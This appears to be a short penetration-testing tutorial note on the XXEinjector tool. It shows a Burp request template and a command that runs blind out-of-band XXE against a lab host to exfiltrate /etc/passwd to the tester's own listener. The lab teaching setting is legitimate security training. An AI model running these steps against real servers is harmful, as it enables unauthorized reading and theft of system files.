# XXE Injector

## Overview

This tool support basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.

## Installation

```shell
git clone https://github.com/enjoiz/XXEinjector.git
```

## Usage

we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool:

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now, we can run the tool with the --host/--httpport flags being our IP and port, the --file flag being the file we wrote above, and the --path flag being the file we want to read. We will also select the --oob=http and --phpfilter flags:

```shell
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the Logs folder under the tool, and we can find our file there:

```shell
cat Logs/10.129.201.94/etc/passwd.log 
```
